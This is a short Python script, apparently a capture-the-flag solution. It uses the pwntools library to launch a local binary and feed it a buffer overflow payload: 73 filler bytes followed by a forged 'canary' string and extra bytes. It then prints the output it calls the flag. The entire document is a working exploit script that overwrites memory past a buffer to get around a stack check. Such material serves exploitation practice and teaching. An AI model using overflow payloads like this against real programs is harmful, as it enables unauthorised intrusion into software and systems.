from pwn import *

p = process('./a.out')

p.sendline(b'A'*73+b'canary\0'+b'test')
flag = p.recvall()
print(flag.decode())